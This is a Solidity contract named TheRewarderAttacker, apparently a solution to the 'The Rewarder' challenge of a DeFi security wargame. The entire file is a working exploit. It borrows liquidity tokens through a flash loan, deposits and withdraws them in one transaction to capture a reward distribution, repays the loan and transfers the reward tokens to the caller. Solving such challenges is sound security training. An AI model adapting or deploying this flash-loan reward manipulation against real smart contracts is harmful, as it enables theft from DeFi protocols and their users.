pragma solidity ^0.6.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

contract TheRewarderAttacker {

	FlashLoanerPool public flashLoanerPool;
	TheRewarderPool public theRewarderPool;

	address public flashLoanerPoolAddress;
	address public theRewarderPoolAddress;

	constructor(
		address _flashLoanerPoolAddress,
		address _theRewarderPoolAddress
	) public {
		flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
		theRewarderPool = TheRewarderPool(_theRewarderPoolAddress);
		flashLoanerPoolAddress = _flashLoanerPoolAddress;
		theRewarderPoolAddress = _theRewarderPoolAddress;
	}

	function initiateFlashLoanAttack(uint256 amount) public {
		flashLoanerPool.flashLoan(amount);
		theRewarderPool.rewardToken().transfer(
			msg.sender,
			theRewarderPool.rewardToken().balanceOf(address(this))
		);
	}

	function receiveFlashLoan(uint256 amount) public {
		theRewarderPool.liquidityToken().approve(theRewarderPoolAddress, amount);
		theRewarderPool.deposit(amount);
		theRewarderPool.withdraw(amount);
		theRewarderPool.liquidityToken().transfer(msg.sender, amount);
	}

	receive() external payable {}
}